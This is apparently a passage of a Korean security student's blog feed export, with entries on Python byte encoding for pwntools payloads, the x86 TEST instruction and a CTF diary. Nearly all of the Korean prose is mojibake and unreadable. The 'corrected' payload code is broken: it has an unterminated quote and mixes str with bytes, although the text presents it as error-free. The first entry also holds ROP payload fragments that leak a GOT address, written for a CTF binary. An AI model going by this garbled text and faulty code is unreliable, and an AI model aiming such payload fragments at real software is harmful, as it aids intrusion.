id="PythonÏóêÏÑúÏÑúÏùò-Î¨∏ÏûêÏó¥-Ïù∏ÏΩîÎî©"><a href="#PythonÏóêÏÑúÏÑúÏùò-Î¨∏ÏûêÏó¥-Ïù∏ÏΩîÎî©" class="headerlink" title="PythonÏóêÏÑúÏÑúÏùò Î¨∏ÏûêÏó¥ Ïù∏ÏΩîÎî©"></a>PythonÏóêÏÑúÏÑúÏùò Î¨∏ÏûêÏó¥ Ïù∏ÏΩîÎî©</h2><p>Ïª¥Ìì®ÌÑ∞Í∞Ä Ï†ÄÏû•Ìï† Ïàò Ïú†ÏùºÌïú Í≤ÉÏùÄ byteÏù¥Îã§. Í∑∏ÎûòÏÑú Ïù∏ÏΩîÎî© Ï¶â, byteÎ°ú Î≥ÄÌôòÌï¥ÏïºÌïòÎäî Í≥ºÏ†ïÏùÑ Í±∞Ï≥êÏïº ÌïúÎã§. PythonÏóêÏÑúÏùò Î¨∏ÏûêÏó¥ Ïù∏ÏΩîÎî© Î∞©ÏãùÏùÑ ÏïåÏïÑÎ≥¥Ïûê.</p><h3 id="Python2"><a href="#Python2" class="headerlink" title="Python2"></a>Python2</h3><p>Python2ÏóêÏÑúÎäî <code>ASCII</code>Í∞Ä ÎîîÌè¥Ìä∏ Ïù∏ÏΩîÎî© Î∞©Î≤ïÏúºÎ°ú ÎêòÏñ¥ÏûàÎã§. <code>ASCII</code>Î°úÎäî ÌïúÍ∏ÄÏùÑ ÌëúÌòÑÌï† Ïàò ÏóÜÏúºÎØÄÎ°ú, ÌïúÍ∏ÄÏùÑ ÌëúÌòÑÌïòÍ∏∞ ÏúÑÌï¥ÏÑú ÏïÑÎûòÏùò ÏΩîÎìúÎ•º ÏΩîÎìú Îß® ÏúóÏ§ÑÏóê Îî∞Î°ú Î™ÖÏãúÌï¥ÏïºÌïúÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure><h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h3><p>Python3ÏóêÏÑúÎäî <code>UTF-8</code>Ïù¥ ÎîîÌè¥Ìä∏ Ïù∏ÏΩîÎî© Î∞©Î≤ïÏù¥Îã§. Í∑∏ÎûòÏÑú Î™®Îì† Î¨∏ÏûêÏó¥ÏùÄ <code>Ïú†ÎãàÏΩîÎìú</code>Î°ú Ï≤òÎ¶¨ÎêúÎã§. <code>b&#39;&#39;</code>Îäî byteÏûÑÏùÑ ÏùòÎØ∏ÌïúÎã§. ÎîîÌè¥Ìä∏Î°ú <code>UTF-8</code>Î°ú Ïù∏ÏΩîÎî©ÎêòÏñ¥ byte Î¨∏ÏûêÏó¥Î°ú ÌëúÌòÑÌñàÏúºÎØÄÎ°ú Ïù¥Í≤ÉÏùÑ Îã§Ïãú<code>.decode()</code>ÌïòÎ©¥ <code>UTF-8</code>Î°ú ÎîîÏΩîÎî©ÌïòÏó¨ Î¨∏ÏûêÏó¥Î°ú ÌëúÌòÑÌï† Ïàò ÏûàÎã§. </p><p>Ï†ïÎ¶¨ÌïòÎ©¥ Ïù∏ÏΩîÎî© Î∞©ÏãùÎßå ÏïåÎ©¥ byte Î¨∏ÏûêÏó¥ÏùÑ Îã§Ïãú Î¨∏ÏûêÏó¥Î°ú ÎîîÏΩîÎî©Ìï† Ïàò ÏûàÎã§Îäî ÏùòÎØ∏Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b&#x27;jir4vvit&#x27;</span><br><span class="line">b&#x27;jir4vvit&#x27;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;bytes&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; b&#x27;jir4vvit&#x27;.decode()</span><br><span class="line">&#x27;jir4vvit&#x27;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>ÏöîÏ¶ò PwnableÏùÑ ÌíÄ Îïå Python3ÏúºÎ°ú ÏûëÏÑ±ÌïòÍ≥† ÏûàÎã§. Ïù¥Í≤ÉÏùÑ Ìó∑Í∞àÎ¶¨Í≥† Í∞ÄÏû• Ï≤òÏùåÏóê ÌñàÎçò Ïã§ÏàòÎäî ÏïÑÎûòÏôÄ Í∞ôÎã§. ÏßÄÍ∏à ÏÉùÍ∞ÅÌï¥Î≥¥Î©¥ Ïôú Ïù¥Î†áÍ≤å ÌñàÏóàÎäîÏßÄ Ïù¥Ìï¥Í∞Ä ÏïàÍ∞ÑÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str(b&#x27;jir4vvit&#x27;)</span><br><span class="line">&quot;b&#x27;jir4vvit&#x27;&quot;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>Î¨∏ÏûêÏó¥Ïóê ÎåÄÌïú Ïù¥Ìï¥Î•º Ï†úÎåÄÎ°ú ÌïòÏßÄ ÏïäÍ≥† Ï†ÄÏßÄÎ•∏ Ïã§ÏàòÏù¥Îã§. Python3ÎãàÍπå Ïñ¥ÎîîÏÑú ÎßéÏù¥ Î≥∏ <code>b&#39;&#39;</code>ÏúºÎ°ú Î¨∏ÏûêÏó¥ÏùÑ Í∞êÏã∏Í≥† Ïù¥Í±∏ <code>str()</code>Î°ú Í∞êÏã∏ÏÑú <code>p.send()</code>ÌñàÏóàÎã§. </p><p><strong>Ïó¨Îü¨ ÏãúÎèÑ ÎÅùÏóê ÎßàÏùåÌé∏ÌïòÍ≤å byte Î¨∏ÏûêÏó¥Î°ú payloadÎ•º Íµ¨ÏÑ±ÌïòÍ∏∞Î°ú ÌñàÎã§.</strong></p><p>ÏïÑÎûòÏ≤òÎüº Î¨∏ÏûêÏó¥Î°ú payloadÎ•º Íµ¨ÏÑ±ÌïòÎ©¥ Îê† ÎïåÎèÑ ÏûàÍ≥† ÏïàÎê† ÎïåÎèÑ ÏûàÎã§. ÎêòÎäî Í±¥ Ïö¥Ïù¥ Ï¢ãÏùÄ ÎïåÍ≥†, ÏïàÎê† ÎïåÎäî ÏóêÎü¨Í∞Ä Î∞úÏÉùÌïúÎã§. (ÏïàÎêòÎäî Í≤ΩÏö∞Í∞Ä Îçî ÎßéÏùÑ Í≤É Í∞ôÎã§.)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += &#x27;A&#x27; * 0x50</span><br><span class="line">payload += &#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27; # rbp</span><br><span class="line">payload += &#x27;\x83\x0c\x40\x00\x00\x00\x00\x00&#x27; # pop rdi</span><br><span class="line">payload += p64(e.got[&#x27;puts&#x27;]).decode()</span><br><span class="line">payload += &#x27;\xe0\x06\x40\x00\x00\x00\x00\x00&#x27; # puts plt</span><br><span class="line">payload += p64(main).decode()</span><br></pre></td></tr></table></figure><p>Ïã§Ï†úÎ°ú ÏïÑÎûòÏôÄ Í∞ôÏùÄ ÎîîÏΩîÎìúÍ∞Ä ÏïàÎêúÎã§Îäî ÏóêÎü¨Î•º Î∞õÏïòÏóàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/jir4vvit/ex.py&quot;, line 99, in &lt;module&gt;</span><br><span class="line">    payload += p64(binsh).decode()</span><br><span class="line">UnicodeDecodeError: &#x27;utf-8&#x27; codec can&#x27;t decode byte 0xcf in position 1: invalid continuation byte</span><br></pre></td></tr></table></figure><p>ÎßàÏùåÌé∏Ìûà byteÎ°ú Î≥¥ÎÇ¥Î©¥ Ï†ÄÎü∞ ÎîîÏΩîÎî© ÏóêÎü¨Î•º ÎßåÎÇ† ÏùºÏù¥ ÏóÜÎã§. pwntoolsÎäî Í∏∞Î≥∏Ï†ÅÏúºÎ°ú byteÎ°ú Ï≤òÎ¶¨ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê payloadÎ•º ÏïÑÎûòÏ≤òÎüº byteÎ°ú ÏûëÏÑ±Ìï¥Ï£ºÎ©¥ Ï†ïÎßêÏ†ïÎßê ÎîîÏΩîÎî© ÏóêÎü¨Î•º ÎßåÎÇ† ÏùºÏù¥ ÏóÜÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += b&#x27;A&#x27; * 0x50</span><br><span class="line">payload += p64(0) # rbp</span><br><span class="line">payload += p64(pop_rdi) </span><br><span class="line">payload += p64(e.got[&#x27;puts&#x27;])</span><br><span class="line">payload += p64(e.symbols[&#x27;puts])</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure><p>ÎòêÌïú Python2ÏôÄ Îã§Î•¥Í≤å byte Î¨∏ÏûêÏó¥Í≥º Î¨∏ÏûêÏó¥ÏùÑ ÌòºÌï©Ìï¥ÏÑú ÏûëÏÑ±Ìï† Ïàò ÏóÜÎã§. ÏùºÍ¥ÄÎêòÍ≤å ÏûëÏÑ±Ìï¥Ïïº ÌïúÎã§. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://whatisthenext.tistory.com/103">https://whatisthenext.tistory.com/103</a></li><li><a href="https://velog.io/@zionhann/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EB%AC%B8%EC%9E%90-%EB%B3%80%ED%99%98%ED%95%98%EA%B8%B0">https://velog.io/@zionhann/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EB%AC%B8%EC%9E%90-%EB%B3%80%ED%99%98%ED%95%98%EA%B8%B0</a></li><li><a href="https://finebe.tistory.com/42">https://finebe.tistory.com/42</a></li><li><a href="https://velog.io/@goggling/%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C%EC%99%80-UTF-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0">https://velog.io/@goggling/%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C%EC%99%80-UTF-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0</a></li></ul><p>Ïù¥ Í∏ÄÏùÑ ÏûëÏÑ±Ìï† ÎãπÏãúÏóî ÎåìÍ∏ÄÍ∏∞Îä•Ïù¥ ÏóÜÎã§. ÌãÄÎ¶∞ ÎßêÏù¥ÎÇò Ï≤®Ïñ∏Ïù¥ ÏûàÎã§Î©¥ Î©îÏùº Ìïú ÌÜµ Î∂ÄÌÉÅÎìúÎ¶ΩÎãàÎã§. Î©îÏùº Ï£ºÏÜåÎäî <a href="https://jiravvit.github.io/">Î∏îÎ°úÍ∑∏ Î©îÏù∏ ÌôîÎ©¥</a> ÏóêÏÑú Ï∞æÏùÑ Ïàò ÏûàÏäµÎãàÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Etc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
            <tag> string </tag>
            
            <tag> Unicode </tag>
            
            <tag> ASCII </tag>
            
            <tag> byte </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>What does the &#39;TEST&#39; instruction do</title>
      <link href="/221013-test-instruction/"/>
      <url>/221013-test-instruction/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Ïñ¥ÏÖàÎ∏îÎ¶¨Ïñ¥ÏóêÏÑú <code>TEST</code> Î™ÖÎ†πÏñ¥Îäî <code>eax</code>Ïùò Í∞íÏù¥ 0Ïù¥ÎÉê ÏïÑÎãàÎÉêÎ•º ÌåêÎã®ÌïòÍ∏∞ ÏúÑÌï¥ÏÑú ÏÇ¨Ïö©ÌïúÎã§. ÎßåÏïΩ <code>eax</code>Ïùò Í∞íÏù¥ 0Ïù¥ÎùºÎ©¥ (<code>zf</code>Í∞Ä ÏÑ∏ÌåÖÎêòÏñ¥) Îí§Ïóê <code>JE</code>ÎÇò <code>JZ</code> Î™ÖÎ†πÏñ¥Í∞Ä Ïò®Îã§Î©¥ jumpÌïúÎã§.</p><h2 id="TEST-Î™ÖÎ†πÏñ¥"><a href="#TEST-Î™ÖÎ†πÏñ¥" class="headerlink" title="TEST Î™ÖÎ†πÏñ¥"></a>TEST Î™ÖÎ†πÏñ¥</h2><p>Î¨∏Ï†úÎ•º ÌíÄÎã§Í∞Ä Ïñ∏Ï†ú jumpÌïòÎäîÏßÄ Ìï≠ÏÉÅ Ìó∑Í∞àÎ†§ÏÑú Î∏îÎ°úÍ∑∏Ïóê Ï†ïÎ¶¨ÌïòÎ†§Í≥† ÌïúÎã§..</p><p>ÏïÑÎûòÎäî ÏòàÏãú Ïñ¥ÏÖàÎ∏îÎ¶¨Ïñ¥Ïù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000131E</span><br><span class="line">.text:0000131E loc_131E:</span><br><span class="line">.text:0000131E lea     eax, (var - 4000h)[ebx]</span><br><span class="line">.text:00001324 mov     edx, [eax+38h]</span><br><span class="line">.text:00001327 mov     eax, [eax+34h]</span><br><span class="line">.text:0000132A xor     eax, 11h</span><br><span class="line">.text:0000132D or      eax, edx</span><br><span class="line">.text:0000132F test    eax, eax</span><br><span class="line">.text:00001331 jnz     short loc_1347</span><br></pre></td></tr></table></figure><p>Í∞ÑÎã®ÌïòÎã§.</p><p><code>test    eax, eax</code> ÏóêÏÑú <code>eax</code>Í∞Ä 0Ïù∏ÏßÄ ÌåêÎã®ÌïòÍ≥†, ÎßåÏïΩ 0Ïù¥ÎùºÎ©¥ <code>zf</code>Í∞Ä 1Î°ú ÏÑ∏ÌåÖÎêúÎã§. <code>jnz(=jump not zero)</code> Î™ÖÎ†πÏñ¥Îäî Ïù¥Î¶Ñ Í∑∏ÎåÄÎ°ú 0Ïù¥ ÏïÑÎãê Í≤ΩÏö∞ jumpÌïòÍ∏∞ ÎïåÎ¨∏Ïóê <code>eax</code>Í∞Ä 0Ïù¥ÎùºÎ©¥ jumpÌïòÏßÄ ÏïäÎäîÎã§. </p><p>ÌïòÏßÄÎßå Î¨∏Ï†ú ÌíÄ Îïå ÏùòÏô∏Î°ú ÎßéÏù¥ Ìó∑Í∞àÎ†∏ÏúºÎØÄÎ°ú Ïù¥ Î°úÏßÅÏùÑ Ï°∞Í∏à Îçî ÎúØÏñ¥Î≥¥Ïûê.</p><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text:00001324 mov     edx, [eax+38h]</span><br><span class="line">.text:00001327 mov     eax, [eax+34h]</span><br></pre></td></tr></table></figure><ul><li>Ïù¥ Ïó∞ÏÇ∞ÏùÄ <code>edx</code>ÏôÄ <code>eax</code> Ï£ºÏÜåÏóê Í∞íÏùÑ Ï†ÄÏû•ÌïòÎäî Ïó∞ÏÇ∞Ïù¥Îã§.</li><li>ÏÇ¨Ïö©Ïûê Ïù∏ÌíãÏùÄ <code>eax</code> Ï£ºÏÜåÏóê Ï†ÄÏû•ÎêúÎã§. bssÏòÅÏó≠ Ï†ïÏùòÎêú Î∞∞Ïó¥Ïóê Í∞íÏùÑ Ïì∞ÎäîÎç∞ Ïñ¥Ïß∏ÏÑ†ÏßÄ Î∞∞Ïó¥Ïùò ÏÇ¨Ïù¥Ï¶àÎ•º Î™®Î•¥Îäî ÏÉÅÌô©Ïù¥Îã§.</li><li><code>edx</code>Ïóê Î∞∞Ïó¥ Î∞ñÏùò Í∞íÏù¥ Ï†ÄÏû•ÎêúÎã§Îäî ÏÇ¨Ïã§ÏùÑ ÌååÏïÖÌï¥Î≥¥Ïûê.</li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132A xor     eax, 11h</span><br></pre></td></tr></table></figure><ul><li><code>xor</code> Ïó∞ÏÇ∞ÏùÑ ÏßÑÌñâÌïúÎã§. <code>eax</code>Í∞Ä 0x11ÎùºÎ©¥ 0ÏúºÎ°ú Ï¥àÍ∏∞ÌôîÍ∞Ä ÎêòÍ≤†Í≥†, 0Ïù¥ÎùºÎ©¥ <code>eax</code>Ïóê 0x11Í∞Ä Ï†ÄÏû•Îê† Í≤É Ïù¥Îã§.</li><li>Ïïû Î∂ÄÎ∂Ñ Î∂ÑÏÑùÏùÑ Ìï¥Î≥¥Î©¥ <code>eax</code>Ïóê Î¨¥Ï°∞Í±¥ 0x11ÏùÑ ÎÑ£Í≥† Ïã∂Ïñ¥Ïßà Í≤ÉÏù¥Í∏∞ ÎïåÎ¨∏Ïóê Ïù¥ Ïó∞ÏÇ∞ Í∞íÏùÄ 0Ïù¥ ÎêòÍ≥† <code>eax</code>Ïóê 0Ïù¥ Îã¥Í∏¥Îã§.</li></ul><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132D or      eax, edx</span><br></pre></td></tr></table></figure><ul><li><code>or</code> Ïó∞ÏÇ∞ÏùÑ ÏßÑÌñâÌïúÎã§. Îëê Í∞í Ï§ë Ïñ¥Îäê ÌïòÎÇòÎùºÎèÑ 0Ïù¥ ÏïÑÎãàÎ©¥ 0Ïù¥ ÏïÑÎãå ÏàòÍ∞Ä <code>eax</code>Ïóê Îã¥Í∏∏ Í≤ÉÏù¥Îã§. </li><li>ÌòÑÏû¨ <code>eax</code>ÏùÄ 0ÏúºÎ°ú Í≥†Ï†ïÏù¥ÎØÄÎ°ú <code>edx</code> Í∞íÏóê ÏßëÏ§ëÌïòÏó¨ Î∂ÑÏÑùÌï¥Î≥¥Ïûê.</li><li><code>edx</code>Í∞Ä 0Ïù¥ÎùºÎ©¥? <code>0 | 0 = 0</code>, <code>eax</code>Ïùò Í∞íÏùÄ 0Ïù¥ ÎêúÎã§.</li><li><code>edx</code>Í∞Ä XÎùºÎ©¥? <code>0 | X = X</code>, <code>eax</code>Ïùò Í∞íÏùÄ XÏù¥ ÎêúÎã§.</li></ul><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132F test    eax, eax</span><br></pre></td></tr></table></figure><ul><li><code>eax</code>Í∞Ä 0Ïù∏ÏßÄÎ•º Í≤ÄÏÇ¨ÌïúÎã§. Ïã§Ï†úÎ°ú <code>eax</code>Ïóê Í∞íÏùÑ Ïì∞ÏßÄÎäî ÏïäÎäîÎã§.</li><li><code>eax</code>Í∞Ä 0Ïù∏ Í≤ΩÏö∞: <code>edx</code>Ïùò Í∞íÏù¥ 0Ïù∏ Í≤ΩÏö∞ </li><li><code>eax</code>Í∞Ä XÏù∏ Í≤ΩÏö∞: <code>edx</code>Ïùò Í∞íÏù¥ XÏù∏ Í≤ΩÏö∞</li></ul><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00001331 jnz     short loc_1347</span><br></pre></td></tr></table></figure><ul><li><code>jnz = jump not zero</code></li><li><code>eax</code>Í∞Ä 0Ïù¥ ÏïÑÎãàÎ©¥ jumpÌïúÎã§.</li><li>Ï∞∏Í≥†Î°ú <code>loc_1347</code>ÏùÄ Ïã§ÌñâÌïòÍ≥† Ïã∂ÏùÄ Î°úÏßÅÏù¥ ÏïÑÎãàÎã§.</li><li>Í≤∞Î°†Ï†ÅÏúºÎ°ú jumpÎ•º ÌïòÎ©¥ ÏïàÎêòÍ≥†, <code>eax</code>Í∞Ä 0Ïù¥Ïñ¥Ïïº ÌïúÎã§. <code>eax</code>Í∞Ä 0Ïù¥Î†§Î©¥ <code>edx</code>Í∞Ä 0Ïù¥Ïñ¥Ïïº ÌïúÎã§.</li><li>overflowÎïåÎ¨∏Ïóê <code>edx</code>Ïóê Í∞íÏùÑ ÏûÖÎ†•Ìï† Ïàò ÏûàÏßÄÎßå Î∞∞Ïó¥ ÌÅ¨Í∏∞ Í≤ÄÏÇ¨Î•º ÏßÑÌñâÌñàÍ∏∞ ÎïåÎ¨∏Ïóê Í∞íÏùÑ Ïì∞Î©¥ ÏïàÎêúÎã§Îäî Í≤∞Î°†ÏùÑ ÏñªÏùÑ Ïàò ÏûàÎã§.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Etc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rev </tag>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-11 Diary</title>
      <link href="/221011-diary/"/>
      <url>/221011-diary/</url>
      
        <content type="html"><![CDATA[<h2 id="Î∏îÎ°úÍ∑∏-Ïù¥Ï†Ñ"><a href="#Î∏îÎ°úÍ∑∏-Ïù¥Ï†Ñ" class="headerlink" title="Î∏îÎ°úÍ∑∏ Ïù¥Ï†Ñ"></a>Î∏îÎ°úÍ∑∏ Ïù¥Ï†Ñ</h2><p>9Ïõî Ï§ëÏàú? Îßê? ÏØ§Ïóê Î∏îÎ°úÍ∑∏ ÌîåÎû´ÌèºÏùÑ ÏòÆÍ≤ºÏóàÎã§. ÏõêÎûòÎäî <a href="https://jiravvit.tistory.com/">Ìã∞Ïä§ÌÜ†Î¶¨ Î∏îÎ°úÍ∑∏</a>Î•º Ïù¥Ïñ¥ÏÑú Ïì∞Î†§Í≥† ÌñàÏóàÎã§. ÌïòÏßÄÎßå Í∞úÏù∏Ï†ÅÏúºÎ°ú Ìã∞Ïä§ÌÜ†Î¶¨ Î∏îÎ°úÍ∑∏Ïùò ÏΩîÎìúÎ∏îÎü≠Ïù¥ ÍµâÏû•Ìûà ÎßàÏùåÏóê ÏïàÎì§ÏóàÍ≥† Í∑∏ÎÉ• Î≠îÍ∞Ä ÏÉàÎ°úÏö¥ Í∏∞Î∂ÑÏùÑ ÎÇ¥Í≥† Ïã∂Ïñ¥ÏÑú Î∏îÎ°úÍ∑∏ ÌîåÎû´ÌèºÏùÑ ÏòÆÍ∏∞Í≥† Ïã∂Îã§Îäî ÏÉùÍ∞ÅÏù¥ Îì§ÏóàÎã§. Í∑∏Îü¨Îçò Ï§ëÏóê ÏßÄÍ∏à ÏûëÏÑ± Ï§ëÏù∏ github Î∏îÎ°úÍ∑∏Î•º Ï∂îÏ≤úÎ∞õÏïòÎã§. </p><p>Í∑∏ÎûòÏÑú github Î∏îÎ°úÍ∑∏Î•º Í∞úÏÑ§ÌïòÍ≥† Í∏ÄÎèÑ Î™áÍ∞ú Ï†ÅÏñ¥ÎÜ®ÏóàÎäîÎç∞, Ïö¥ÏòÅÏ≤¥Ï†úÎ•º Î∞îÍæ∏Îã§Í∞Ä Î∏îÎ°úÍ∑∏Î•º ÎÇ†Î†§Î®πÏóàÎã§.</p><p>ÎÇòÎäî HexoÎ•º Ïù¥Ïö©ÌïòÍ≥† ÏûàÎã§. HexoÎäî <code>hexo generate</code> Î™ÖÎ†πÏúºÎ°ú public Ìè¥Îçî ÏïàÏóê Ï†ïÏ†Å ÌååÏùºÏùÑ ÏÉùÏÑ±ÌïòÍ≥†, <code>hexo deploy</code>Î°ú Í∑∏ Ï†ïÏ†Å ÌååÏùºÎì§ÏùÑ gitÏóê Ïò¨Î¶¨Í∏∞ ÏúÑÌï¥ <code>.deploy_git</code> Ìè¥ÎçîÏóê Î≥µÏÇ¨ÌïòÍ≥† Ïù¥ Í≥≥Ïóê ÏûàÎäî Í≤ÉÎßå ÍπÉÌóàÎ∏å Î∏îÎ°úÍ∑∏Ïóê Ïò¨ÎùºÍ∞ÄÎäî Íµ¨Ï°∞Ïù¥Îã§.</p><p>Í∑∏ÎûòÏÑú ÎßåÏïΩ Îã§Î•∏ Ïª¥Ìì®ÌÑ∞ÏóêÏÑú Î∏îÎ°úÍ∑∏ Í∏ÄÏùÑ ÏûëÏÑ±ÌïòÍ≥† Ïã∂Îã§Î©¥ hexo Î∏îÎ°úÍ∑∏Î•º ÏÉùÏÑ±Ìï¥Ï£ºÎäî ÌååÏùº Ï†ÑÏ≤¥Î•º Îã¥Îäî Ìè¥ÎçîÎèÑ Í¥ÄÎ¶¨Î•º Ìï¥ÏïºÌïúÎã§. „Öã„Öã..</p><p>ÏïÑÎ¨¥Ìäº ÎÇ†Î†§Î®πÏñ¥ÏÑú Ï†àÎßùÏóê Îπ†Ï†∏ÏûàÏóàÎäîÎç∞ Îã§ÌñâÌûà Í∏ÄÏùÑ ÏûëÏÑ±ÌñàÎçò mdÌååÏùºÏùÄ Í∞ÄÏßÄÍ≥† ÏûàÏóàÏñ¥ÏÑú ÎÇ¥Ïö© ÏûêÏ≤¥Î•º Ï†ÑÎ∂Ä ÎÇ†Î†§Î®πÏßÄÎäî ÏïäÏïòÎã§. ÏÇ¨Ïã§ Î∏îÎ°úÍ∑∏ ÌÖåÎßàÎèÑ Ï°∞Í∏à ÎßàÏùåÏóê ÏïàÎì§ÏóàÏñ¥ÏÑú Î∞îÍæ∏Í≥† Ïã∂ÏùÄ ÏöïÏã¨Ïù¥ ÏûàÏóàÎäîÎç∞ ÏûòÎêêÏßÄ Î≠ê‚Ä¶ T.T</p><p>Ï†ÑÏóê Ïì∞Îçò Î∏îÎ°úÍ∑∏ ÌÖåÎßàÎäî light Î™®ÎìúÎäî ÏòàÏÅúÎç∞ dark Î™®ÎìúÎäî Î≥ÑÎ°ú ÏòàÏÅòÏßÄÍ∞Ä ÏïäÏïòÎã§. Ïñ¥ÎëêÏö¥ Í≥≥ÏóêÏÑú Ïª¥Ìì®ÌÑ∞Î•º ÌïòÎäî ÎπÑÏú®Ïù¥ ÎßéÏïÑÏ†∏ÏÑú dark Î™®ÎìúÎ•º Ï°∞Í±¥ÏúºÎ°ú ÌÖåÎßàÎ•º Ïù¥Î¶¨Ï†ÄÎ¶¨ ÎëòÎü¨Î¥§ÎäîÎç∞, ÏßÄÍ∏à Ïì∞Í≥† ÏûàÎäî Ïù¥ ÌÖåÎßàÍ∞Ä dark Î™®ÎìúÏóêÏÑú Í∞ÄÏû• Ïù¥ÏÅòÎã§Í≥† ÏÉùÍ∞ÅÌñàÎã§. </p><p>ÎÇòÏ§ëÏóê sitemapÎèÑ Îã§Ïãú Îì±Î°ùÌïòÍ≥† ÎåìÍ∏Ä Í∏∞Îä•ÎèÑ Ï∞®Ï∞® Ï∂îÍ∞ÄÌï¥ÏïºÍ≤†Îã§.. </p><h2 id="POXX-2022-ÏòàÏÑ†"><a href="#POXX-2022-ÏòàÏÑ†" class="headerlink" title="POXX 2022 ÏòàÏÑ†"></a>POXX 2022 ÏòàÏÑ†</h2><p>ÏñºÎßà Ï†ÑÏóê Ïó¨ÏÑ± Ìï¥ÌÇπ ÎåÄÌöå POXX ÏòàÏÑ†Ïù¥ ÏûàÏóàÎã§. DemonÌåÄÏúºÎ°úÏÑú pwn 2Î¨∏Ï†ú, rev 1Î¨∏Ï†úÎ•º Ï∂úÏ†úÌñàÎã§. Î¨∏Ï†úÏóê ÎåÄÌïú Ïù¥ÏïºÍ∏∞Î•º ÌíÄÏñ¥Î≥¥Í≥† Ïã∂ÏùÄÎç∞ Î≥∏ÏÑ† ÎÅùÎÇòÍ≥† ÌíÄÍ≥†Ïûê ÌïúÎã§. pwn 2Î¨∏Ï†úÎäî Í∞ÅÍ∞Å 3, 2 solveÎ•º Îã¨ÏÑ±ÌñàÎã§. Î™©ÌëúÌñàÎçò solve ÏàòÏôÄ ÎπÑÏä∑Ìï¥ÏÑú Îã§ÌñâÏù¥ÏóàÎã§.</p><h2 id="ÏûêÏûòÌïú-Ïù¥ÏïºÍ∏∞"><a href="#ÏûêÏûòÌïú-Ïù¥ÏïºÍ∏∞" class="headerlink" title="ÏûêÏûòÌïú Ïù¥ÏïºÍ∏∞"></a>ÏûêÏûòÌïú Ïù¥ÏïºÍ∏∞</h2><ol><li><p>ÏöîÏ¶ò ÎèÑÏª§ÏôÄ ÏπúÌï¥ÏßÄÎ†§Í≥† 